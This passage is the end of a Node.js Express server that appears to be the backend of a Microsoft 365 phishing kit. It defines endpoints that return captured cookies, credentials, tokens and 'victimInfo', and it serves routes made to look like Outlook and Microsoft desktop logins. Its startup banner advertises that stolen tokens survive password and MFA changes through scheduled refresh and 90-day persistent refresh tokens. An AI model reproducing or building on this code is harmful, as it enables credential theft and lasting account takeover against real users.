    cookieCount: debugSession.cookies?.length || 0,
    rawCookies: debugSession.cookies || [],
    credentials: debugSession.credentials,
    tokens: debugSession.tokens,
    victimInfo: debugSession.victimInfo
  });
});

app.get('/test', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size,
    cae_enabled: true
  });
});

// ============= ERROR HANDLING =============
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Endpoint not found',
    path: req.path
  });
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: err.message 
  });
});

app.use(browserOnlyMiddleware);

// ============= START SCHEDULER =============
const tokenScheduler = new TokenRefreshScheduler();

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 ========== SERVER STARTED ==========`);
  console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
  console.log(`🌐 App URL: ${cleanAppUrl}`);
  console.log(`📡 Port: ${PORT}`);
  console.log(`========================================\n`);
  
  console.log(`🔗 Available endpoints:`);
  console.log(`   ↪️  Root: ${cleanAppUrl}/`);
  console.log(`   🎯 Dual Token (CAE): ${cleanAppUrl}/en-us/microsoft-365/outlook`);
  console.log(`   🖥️  Desktop (CAE): ${cleanAppUrl}/microsoft-desktop`);
  console.log(`   📋 Captured Sessions: ${cleanAppUrl}/captured-sessions`);
  console.log(`   🔍 Token Status: ${cleanAppUrl}/api/token-status/[sessionId]`);
  console.log(`   📤 Export Persistent: ${cleanAppUrl}/api/export-persistent/[sessionId]`);
  console.log(`   🔄 Persistent Sessions: ${cleanAppUrl}/api/persistent-sessions`);
  console.log(`   ❤️  Health: ${cleanAppUrl}/health\n`);
  
  console.log(`✅ CAE-ENABLED FEATURES:`);
  console.log(`   • Tokens survive password changes automatically`);
  console.log(`   • Tokens survive MFA changes automatically`);
  console.log(`   • Auto-refresh every 30 minutes before expiry`);
  console.log(`   • Claims challenge handling enabled`);
  console.log(`   • 90-day persistent refresh tokens\n`);
  
  // Start the token refresh scheduler
  setTimeout(() => {
    tokenScheduler.start();
    console.log('✅ Persistent token management system initialized\n');
  }, 5000);
});